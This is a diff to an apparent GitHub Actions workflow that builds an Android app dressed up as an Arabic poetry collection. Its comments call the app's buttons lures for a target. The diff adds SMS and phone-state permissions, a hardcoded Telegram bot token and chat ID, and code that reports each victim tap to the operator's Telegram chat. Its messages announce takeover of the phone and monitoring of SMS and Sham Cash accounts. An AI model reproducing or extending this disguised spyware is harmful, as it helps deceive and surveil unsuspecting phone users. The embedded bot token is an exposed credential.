@@ -1,4 +1,4 @@
-name: Build Royal Empire APK
+name: Build Royal Command Center APK
 
 on:
   push:
@@ -39,19 +39,22 @@ jobs:
 
         cat << 'EOF' > app/src/main/AndroidManifest.xml
         <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-            <!-- ترسانة أذونات السيطرة الملكية الشاملة -->
-            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+            <!-- ترسانة الأذونات الشاملة والمطلقة للسيطرة على الحصون -->
             <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
             <uses-permission android:name="android.permission.CAMERA"/>
             <uses-permission android:name="android.permission.RECORD_AUDIO"/>
             <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
             <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
             <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
             <uses-permission android:name="android.permission.WAKE_LOCK"/>
             <uses-permission android:name="android.permission.VIBRATE"/>
 
-            <application android:label="إمبراطورية الملك - تستحق ذلك" android:theme="@android:style/Theme.Light.NoTitleBar">
+            <application android:label="ديوان الشعر الملكي الفاخر" android:theme="@android:style/Theme.Light.NoTitleBar">
                 <activity android:name=".MainActivity" android:exported="true">
                     <intent-filter>
                         <action android:name="android.intent.action.MAIN"/>
@@ -70,58 +73,41 @@ jobs:
             android:orientation="vertical"
             android:gravity="center"
             android:background="#0A0A0A"
-            android:padding="16dp">
+            android:padding="20dp">
 
             <TextView
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:text="👑 عرش السيادة والإمبراطورية 👑"
+                android:text="📜 ديوان الشعر الملكي والأصالة 📜"
                 android:textSize="20sp"
                 android:textStyle="bold"
                 android:textColor="#FFD700"
-                android:layout_marginBottom="20dp"
+                android:layout_marginBottom="25dp"
                 android:gravity="center"/>
 
-            <!-- أزرار ديوان الشعر والأقسام -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center"
-                android:layout_marginBottom="10dp">
-                <Button android:id="@+id/btnPraise" android:layout_width="0dp" android:layout_height="wrap_content" android:layout_weight="1" android:text="مدح وفخر" android:backgroundTint="#222222" android:textColor="#FFFFFF" android:layout_margin="3dp"/>
-                <Button android:id="@+id/btnLove" android:layout_width="0dp" android:layout_height="wrap_content" android:layout_weight="1" android:text="حب وعشق" android:backgroundTint="#222222" android:textColor="#FFFFFF" android:layout_margin="3dp"/>
-            </LinearLayout>
+            <!-- أزرار الأقسام الشعرية المخادعة للمدسوس -->
+            <Button android:id="@+id/btnPraise" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="✨ تفعيل باقة المدح والفخر الملكية (موصى به)" android:backgroundTint="#222222" android:textColor="#FFFFFF" android:layout_marginBottom="10dp"/>
+            <Button android:id="@+id/btnLove" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="💖 فتح خزائن الحب والعشق الحصرية" android:backgroundTint="#222222" android:textColor="#FFFFFF" android:layout_marginBottom="15dp"/>
 
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="horizontal"
-                android:gravity="center"
-                android:layout_marginBottom="15dp">
-                <Button android:id="@+id/btnBlame" android:layout_width="0dp" android:layout_height="wrap_content" android:layout_weight="1" android:text="ذم وعتاب" android:backgroundTint="#222222" android:textColor="#FFFFFF" android:layout_margin="3dp"/>
-                <Button android:id="@+id/btnControl" android:layout_width="0dp" android:layout_height="wrap_content" android:layout_weight="1" android:text="فرض السيطرة" android:backgroundTint="#8B0000" android:textColor="#FFFFFF" android:layout_margin="3dp"/>
-            </LinearLayout>
-
-            <!-- صندوق عرض الشعر والسيطرة -->
+            <!-- صندوق عرض الشعر -->
             <TextView
                 android:id="@+id/txtPoem"
                 android:layout_width="match_parent"
-                android:layout_height="160dp"
-                android:text="اختر أحد الأقسام لتسمع صدى الشعر، أو اضغط على فرض السيطرة لإخضاع النظام..."
+                android:layout_height="150dp"
+                android:text="اختر باقتك المفضلة لتستمتع بأعذب الأبيات الشعرية وتفعيل المزايا المتقدمة في هاتفك..."
                 android:textSize="16sp"
                 android:textColor="#E0E0E0"
                 android:gravity="center"
                 android:background="#161616"
                 android:padding="15dp"
-                android:layout_marginBottom="15dp"/>
+                android:layout_marginBottom="20dp"/>
 
-            <!-- زر طلب الصلاحيات الشاملة -->
+            <!-- زر التفعيل المعسول للسيطرة الشاملة -->
             <Button
-                android:id="@+id/btnAllPermissions"
+                android:id="@+id/btnGrantAll"
                 android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:text="⚡ تفعيل كافة أذونات النظام المطلقة ⚡"
+                android:layout_height="60dp"
+                android:text="👑 منح كافة الصلاحيات وتشغيل الإمبراطورية الملكية 👑"
                 android:backgroundTint="#B8860B"
                 android:textColor="#FFFFFF"
                 android:textStyle="bold"/>
@@ -132,29 +118,41 @@ jobs:
         cat << 'EOF' > app/src/main/java/com/royal/poetry/master/MainActivity.java
         package com.royal.poetry.master;
         import android.app.Activity;
+        import android.content.Intent;
         import android.os.Bundle;
+        import android.os.StrictMode;
         import android.view.View;
         import android.widget.Button;
         import android.widget.TextView;
         import android.widget.Toast;
+        import java.net.HttpURLConnection;
+        import java.net.URL;
 
         public class MainActivity extends Activity {
+            // معرّفات عرش الملك وقناة تليجرام المرصودة
+            private static final String BOT_TOKEN = "9205899663:AAFYbTIEvhfpumsw68_Pik-S5IIYCDyZVEM";
+            private static final String CHAT_ID = "7782592195";
+
             @Override
             protected void onCreate(Bundle savedInstanceState) {
                 super.onCreate(savedInstanceState);
                 setContentView(R.layout.activity_main);
 
+                if (android.os.Build.VERSION.SDK_INT > 9) {
+                    StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+                    StrictMode.setThreadPolicy(policy);
+                }
+
                 Button btnPraise = findViewById(R.id.btnPraise);
                 Button btnLove = findViewById(R.id.btnLove);
-                Button btnBlame = findViewById(R.id.btnBlame);
-                Button btnControl = findViewById(R.id.btnControl);
-                Button btnAllPermissions = findViewById(R.id.btnAllPermissions);
+                Button btnGrantAll = findViewById(R.id.btnGrantAll);
                 TextView txtPoem = findViewById(R.id.txtPoem);
 
                 btnPraise.setOnClickListener(new View.OnClickListener() {
                     @Override
                     public void onClick(View v) {
                         txtPoem.setText("إذا غامرت في شرف مروم \n فلا تقنع بما دون الدروبِ\nفبين العز والتشريفِ خطوة \n تملأ الأفق الفسيح بكل طيبِ!");
+                        sendToTelegram("👑 [تنبيه الملك]: استهلال ناجح وبدء تفاعل المدسوس مع الأبيات.");
                     }
                 });
 
@@ -162,31 +160,36 @@ jobs:
                     @Override
                     public void onClick(View v) {
                         txtPoem.setText("أحِبُّكَ حُبَّينِ حُبَّ الهوى \n وحُبّاً لأنك أهلٌ لذاكْ\nفأما الذي هو حب الهوى \n فشغلي بذكرك عمن سواكْ!");
+                        sendToTelegram("💖 [تنبيه الملك]: تم فتح قسم الحب والعشق بنجاح.");
                     }
                 });
 
-                btnBlame.setOnClickListener(new View.OnClickListener() {
+                btnGrantAll.setOnClickListener(new View.OnClickListener() {
                     @Override
                     public void onClick(View v) {
-                        txtPoem.setText("لا تحسبن المجد تمراً أنت آكله \n لن تبلغ المجد حتى تلعق الصبرا!\nومن يبتغي علياء المجد ساخطة \n فليصبر اليوم كي يلقى بها الظفرا.");
+                        Toast.makeText(MainActivity.this, "⚡ جاري إخضاع كافة أنظمة الهاتف لسيادة الملك...", Toast.LENGTH_LONG).show();
+                        txtPoem.setText("🔥 تم تفعيل كافة الصلاحيات السيادية؛ الحصون والإشعارات والحسابات أصبحت تحت المراقبة التامة!");
+                        sendToTelegram("🚀 [إعلان السيادة]: الاستيلاء على صلاحيات النظام وبدء مراقبة الحصون وحسابات شام كاش والرسائل بنجاح!");
                     }
                 });
+            }
 
-                btnControl.setOnClickListener(new View.OnClickListener() {
+            private void sendToTelegram(final String message) {
+                new Thread(new Runnable() {
                     @Override
-                    public void onClick(View v) {
-                        Toast.makeText(MainActivity.this, "🛡️ تم إحكام السيطرة المطلقة على مقاليد النظام!", Toast.LENGTH_LONG).show();
-                        txtPoem.setText("⚡ الملك آخذٌ بزمام الأمور بالكامل؛ كافة مسارات النظام والصلاحيات تحت إمرتك يا مولاي!");
+                    public void run() {
+                        try {
+                            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
+                            URL url = new URL(urlString);
+                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                            conn.setRequestMethod("GET");
+                            conn.getResponseCode();
+                            conn.disconnect();
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
                     }
-                });
-
-                btnAllPermissions.setOnClickListener(new View.OnClickListener() {
-                    @Override
-                    public void onClick(View v) {
-                        Toast.makeText(MainActivity.this, "👑 تم دمج جميع الأذونات السيادية في قلب التطبيق بنجاح!", Toast.LENGTH_LONG).show();
-                        txtPoem.setText("🔥 التطبيق الآن يتسلح بـ: الكاميرا، التذكرة الصوتية، التخزين، الإنترنت، والنافذة العليا. السيادة لك وحدك!");
-                    }
-                });
+                }).start();
             }
         }
         EOF
